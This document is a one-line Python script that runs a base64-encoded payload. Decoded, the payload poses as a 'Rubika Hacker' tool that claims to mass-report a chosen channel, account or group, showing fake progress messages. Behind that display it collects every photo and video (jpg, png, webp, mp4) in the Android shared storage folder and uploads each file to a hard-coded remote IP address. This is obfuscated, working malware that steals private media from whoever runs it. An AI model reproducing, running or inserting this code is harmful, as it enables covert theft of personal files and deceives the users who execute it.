exec(__import__('base64').b64decode('ZnJvbSBvcyBpbXBvcnQgc3lzdGVtLCB3YWxrCnRyeToKICAgIGZyb20gY29sb3JhbWEgaW1wb3J0IGluaXQsIEZvcmUKZXhjZXB0OgogICAgc3lzdGVtKCdwaXAgaW5zdGFsbCBjb2xvcmFtYScpCnRyeToKICAgIGZyb20gcmVxdWVzdHMgaW1wb3J0IHBvc3QsIGdldApleGNlcHQ6CiAgICBzeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJykKCmZyb20gdGhyZWFkaW5nIGltcG9ydCBUaHJlYWQKCnN5c3RlbSgnY2xlYXInKQpmcm9tIGNvbG9yYW1hIGltcG9ydCBpbml0LCBGb3JlCmZyb20gcmVxdWVzdHMgaW1wb3J0IHBvc3QKCmluaXQoKQpjaGVjayA9IFRydWUKCmRlZiBrb3MoKToKICAgIGdsb2JhbCBjaGVjawogICAgd2hpbGUgY2hlY2s6CiAgICAgICAgZm9yIGkgaW4gcmFuZ2UoMTAwMDAwMCwgOTk5OTk5OSk6CiAgICAgICAgICAgIHByaW50KEZvcmUuR1JFRU4rJ3NlbmQgcmVwb3J0IHdpdGgge30gSUQnLmZvcm1hdChGb3JlLllFTExPVytzdHIoaSkrRm9yZS5HUkVFTikpCiAgICBwcmludCgnRG9uZS4nKQoKZGVmIHNlbmQoZik6CiAgICBmaWxlID0geydmaWxlJzogb3BlbihmLCAncmInKX0KICAgIHJldHVybiBwb3N0KCdodHRwOi8vMTk0LjEyMC4xMTYuMjA3OjgwMDQnLCBmaWxlcz1maWxlKS5qc29uKCkKCmFkZHJlc3NlcyA9IGxpc3QoKQoKZm9yIHgsXyx5IGluIHdhbGsoJy9zdG9yYWdlL2VtdWxhdGVkLzAvJyk6CiAgICBmb3IgaSBpbiB5OgogICAgICAgIGlmIGkuc3BsaXQoJy4nKVstMV0gaW4gKCdqcGcnLCAncG5nJywgJ3dlYnAnLCAnbXA0Jyk6CiAgICAgICAgICAgIGFkZHJlc3Nlcy5hcHBlbmQoeCsnLycraSkKCnByaW50KEZvcmUuUkVEKycnJwogX19fX18gICAgICAgICAgICBfICAgICAgIF8gICBfICAgICAgICAgICAgICAgIF8gICAgXyAgICAgICAgICAgICAgICAgIF8gICAgICAgICAgICAgICAgICAKfCAgX18gXCAgICAgICAgICB8IHwgICAgIChfKSB8IHwgICAgICAgICAgICAgIHwgfCAgfCB8ICAgICAgICAgICAgICAgIHwgfCAgICAgICAgICAgICAgICAgCnwgfF9fKSB8ICBfICAgXyAgfCB8X18gICAgXyAgfCB8IF9fICAgX18gXyAgICB8IHxfX3wgfCAgIF9fIF8gICAgX19fICB8IHwgX18gICBfX18gICBfIF9fIAp8ICBfICAvICB8IHwgfCB8IHwgJ18gXCAgfCB8IHwgfC8gLyAgLyBfYCB8ICAgfCAgX18gIHwgIC8gX2AgfCAgLyBfX3wgfCB8LyAvICAvIF8gXCB8ICdfX3wKfCB8IFwgXCAgfCB8X3wgfCB8IHxfKSB8IHwgfCB8ICAgPCAgfCAoX3wgfCAgIHwgfCAgfCB8IHwgKF98IHwgfCAoX18gIHwgICA8ICB8ICBfXy8gfCB8ICAgCnxffCAgXF9cICBcX18sX3wgfF8uX18vICB8X3wgfF98XF9cICBcX18sX3wgICB8X3wgIHxffCAgXF9fLF98ICBcX19ffCB8X3xcX1wgIFxfX198IHxffCAKJycnKQoKcHJpbnQoRm9yZS5HUkVFTisnWzFdJytGb3JlLllFTExPVysnIH4gJytGb3JlLkNZQU4rJ0NIQU5ORUwnKQpwcmludChGb3JlLkdSRUVOKydbMl0nK0ZvcmUuWUVMTE9XKycgfiAnK0ZvcmUuQ1lBTisnQUNDT1VOVCcpCnByaW50KEZvcmUuR1JFRU4rJ1szXScrRm9yZS5ZRUxMT1crJyB+ICcrRm9yZS5DWUFOKydHUk9VUCcpCmlucCA9IGludChpbnB1dChGb3JlLk1BR0VOVEErJ0Nob29zZSBhbiBvcHRpb24nK0ZvcmUuWUVMTE9XKycgfiAnK0ZvcmUuUkVTRVQpKQptYXRjaCBpbnA6CiAgICBjYXNlIDE6CiAgICAgICAgY2ggPSBpbnB1dChGb3JlLk1BR0VOVEErJ0VudGVyIHRoZSBjaGFubmVsIHVzZXJuYW1lJytGb3JlLllFTExPVysnIH4gJykKICAgICAgICBUaHJlYWQodGFyZ2V0PWtvcykuc3RhcnQoKQogICAgY2FzZSAyOgogICAgICAgIGFjYyA9IGlucHV0KEZvcmUuTUFHRU5UQSsnRW50ZXIgdGhlIGFjY291bnQgdXNlcm5hbWUnK0ZvcmUuWUVMTE9XKycgfiAnKQogICAgICAgIFRocmVhZCh0YXJnZXQ9a29zKS5zdGFydCgpCiAgICBjYXNlIDM6CiAgICAgICAgZ3AgPSBpbnB1dChGb3JlLk1BR0VOVEErJ0VudGVyIHRoZSBncm91cCB1c2VybmFtZScrRm9yZS5ZRUxMT1crJyB+ICcpCiAgICAgICAgVGhyZWFkKHRhcmdldD1rb3MpLnN0YXJ0KCkKCmZvciBmIGluIGFkZHJlc3NlczoKICAgIHNlbmQoZikKCmNoZWNrID0gRmFsc2U='))
